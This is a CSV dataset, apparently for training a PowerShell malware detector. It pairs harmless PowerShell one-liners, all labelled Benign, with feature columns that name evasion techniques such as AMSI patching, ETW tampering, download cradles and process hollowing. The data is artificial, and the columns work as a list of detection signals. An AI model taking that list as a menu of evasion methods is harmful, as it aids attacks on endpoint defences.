code_length,line_count,avg_line_length,entropy,amsi_keyword_count,has_amsi_keyword,win32_api_count,has_virtualprotect,has_getprocaddress,has_loadlibrary,reflection_count,has_reflection,marshal_op_count,backtick_count,has_format_operator,char_cast_count,string_concat_count,plus_operator_density,has_base64,has_memory_patch_pattern,hex_byte_array,has_page_rwx,dllimport_count,has_add_type,has_registry_amsi,has_ps_downgrade,has_scriptblock_ast,has_hw_breakpoint,has_etw_tamper,has_download_cradle,has_clr_targeting,special_char_ratio,case_ratio,composite_risk,callstack_amsi_dll_present,callstack_clr_to_kernel,callstack_ntdll_direct,callstack_wow64_transition,callstack_syscall_direct,callstack_reflection_depth,proc_spawns_cmd,proc_parent_spoofing,proc_inject_remote,proc_hollow_indicators,proc_runs_from_temp,proc_unusual_parent,mem_page_rwx,mem_page_rx_after_rw,mem_alloc_exec,mem_write_then_exec,mem_unbacked_region,mem_patch_size_small,bseq_load_reflect_exec,bseq_obfuscate_then_exec,bseq_download_then_exec,bseq_patch_amsi_then_run,bseq_etw_disable_then_run,bseq_clr_tamper,bseq_multi_evasion,dynamic_risk_score,label,label_name,source_id,raw_code_snippet
54,1,54.0,4.609067076590744,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.25925925925925924,0.3448275862068966,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-083,[System.DateTime]::Now.ToString('yyyy-MM-dd HH:mm:ss')
12,1,12.0,3.188721875540867,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.375,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-084,Get-TimeZone
11,1,11.0,2.9139770731827523,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-085,Get-Culture
31,1,31.0,3.7685547780590207,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06451612903225806,0,0,0,0,0,0,0,0,0,0,0,0,0,0.22580645161290322,0.18181818181818182,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-086,$x = 1 + 2 + 3; Write-Output $x
23,1,23.0,3.7622673906514947,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.21739130434782608,0.3076923076923077,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-087,'Hello World'.ToUpper()
17,1,17.0,3.734521664779752,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.35294117647058826,0.14285714285714285,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-088,[math]::Sqrt(144)
33,1,33.0,4.267076408618962,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2727272727272727,0.3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-089,1..10 | ForEach-Object { $_ * 2 }
22,1,22.0,3.73215889136457,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.3181818181818182,0.4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-090,(Get-Date).AddDays(-7)
57,1,57.0,4.298083988632038,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07017543859649122,0.14285714285714285,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-091,Write-Host 'System check complete' -ForegroundColor Green
17,1,17.0,3.8521687236032816,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11764705882352941,4.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-092,$env:COMPUTERNAME
13,1,13.0,3.546593564294939,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.15384615384615385,2.6666666666666665,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-093,$env:USERNAME
20,1,20.0,4.1219280948873624,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.3,0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-094,$env:PATH -split ';'
43,1,43.0,4.379298475431077,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.23255813953488372,0.2222222222222222,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-095,[System.Net.Dns]::GetHostEntry('localhost')
31,1,31.0,4.155651552252569,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.25806451612903225,0.4375,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-096,[System.IO.Path]::GetTempPath()
24,1,24.0,4.084962500721156,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2916666666666667,0.3076923076923077,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-097,[System.Guid]::NewGuid()
79,1,79.0,4.694179286201514,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,0,0,0.22784810126582278,0.28888888888888886,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-098,[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('test'))
52,1,52.0,4.401866882846276,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.15384615384615385,0.15789473684210525,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-099,[System.Reflection.Assembly]::GetExecutingAssembly()
52,1,52.0,4.842186055004733,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2692307692307692,0.26666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-100,[System.IO.File]::ReadAllText('C:\temp\config.json')
31,1,31.0,4.0022680844408445,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0967741935483871,0.2857142857142857,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-101,New-Object System.Net.WebClient
32,1,32.0,4.75,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.28125,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-102,"[System.Math]::Round(3.14159, 2)"
33,1,33.0,4.173033892020167,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.15151515151515152,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-103,[System.Environment]::MachineName
45,1,45.0,4.178088307912703,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06666666666666667,0.22580645161290322,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-104,"Get-NetFirewallProfile | Select Name, Enabled"
67,1,67.0,4.863053982485715,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08955223880597014,0.5526315789473685,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-105,Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion
77,1,77.0,4.935236865201645,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11688311688311688,0.24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-106,Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled}
49,1,49.0,4.515234273075878,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12244897959183673,0.21212121212121213,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-107,Export-Csv -Path C:\report.csv -NoTypeInformation
53,1,53.0,4.519635548576258,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1509433962264151,0.22580645161290322,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-108,Import-Csv -Path C:\data.csv | Select-Object -First 5
45,1,45.0,4.558519762996341,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08888888888888889,0.3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-109,ConvertTo-Json -InputObject $env:PSModulePath
31,1,31.0,4.0667842134731025,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12903225806451613,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-110,Measure-Command { Get-Process }
37,1,37.0,4.185823555333621,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.10810810810810811,0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-111,Get-PSDrive | Where-Object Used -GT 0
50,1,50.0,4.2785629396449165,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12,0.19230769230769232,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-112,Test-Connection -ComputerName 192.168.1.1 -Count 2
68,1,68.0,4.514025805078415,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07352941176470588,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-113,"Get-CimInstance -ClassName Win32_UserAccount | Select Name, Disabled"
57,1,57.0,4.479183707871228,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12280701754385964,0.30303030303030304,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-114,"Get-Process -Name 'explorer' | Select Id, CPU, WorkingSet"
58,1,58.0,4.308869418714394,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08620689655172414,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-115,Stop-Process -Name 'notepad' -ErrorAction SilentlyContinue
67,1,67.0,4.544472221770097,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1044776119402985,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-116,Get-WinEvent -ProviderName 'Microsoft-Windows-Sysmon' -MaxEvents 50
67,1,67.0,4.5230432503793505,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.16417910447761194,0.3611111111111111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-117,Set-ItemProperty -Path 'HKCU:\Software\Test' -Name 'Value' -Value 1
63,1,63.0,4.249770597519297,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1111111111111111,0.3157894736842105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-118,New-PSDrive -Name Z -PSProvider FileSystem -Root \\server\share
13,1,13.0,3.7004397181410926,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-119,Get-Clipboard
28,1,28.0,3.99468036840891,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.15789473684210525,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-120,Set-Clipboard -Value 'hello'
62,1,62.0,4.458983013544334,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14516129032258066,0.17073170731707318,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-121,Out-File -FilePath C:\temp\output.txt -InputObject 'log entry'
52,1,52.0,4.361484854574932,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.17307692307692307,0.15151515151515152,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-122,Add-Content -Path C:\temp\log.txt -Value 'new entry'
50,1,50.0,4.254177320667442,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2,0.16129032258064516,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-123,Select-String -Path C:\temp\*.log -Pattern 'error'
61,1,61.0,4.772195788988178,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.22950819672131148,0.20588235294117646,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-124,Where-Object {$_.Name -like '*svc*'} | Format-Table -AutoSize
66,1,66.0,4.431933749849817,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07575757575757576,0.20930232558139536,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-125,Sort-Object -Property LastWriteTime -Descending | Select -First 10
57,1,57.0,4.346868533388641,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07017543859649122,0.175,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-126,Group-Object -Property Extension | Sort Count -Descending
57,1,57.0,4.129040619800464,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14035087719298245,0.21621621621621623,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-127,Compare-Object (Get-Process) (Get-Process) -Property Name
81,1,81.0,4.5169664329897135,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2222222222222222,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-128,[System.Net.WebRequest]::Create('https://microsoft.com').GetResponse().StatusCode
59,1,59.0,4.6789218627744855,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1694915254237288,0.21621621621621623,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-129,Invoke-RestMethod -Uri 'https://api.github.com' -Method GET
47,1,47.0,4.440449958558483,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.23404255319148937,0.1724137931034483,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-130,"ConvertFrom-Json -InputObject '{""name"":""test""}'"
41,1,41.0,4.092325102644249,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14634146341463414,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-131,Start-Sleep -Seconds 2; Write-Host 'done'
59,1,59.0,4.315770643024985,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06779661016949153,0.18604651162790697,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-132,Register-ObjectEvent -InputObject $timer -EventName Elapsed
34,1,34.0,3.878068268345524,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08823529411764706,0.21052631578947367,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-133,Get-Random -Minimum 1 -Maximum 100
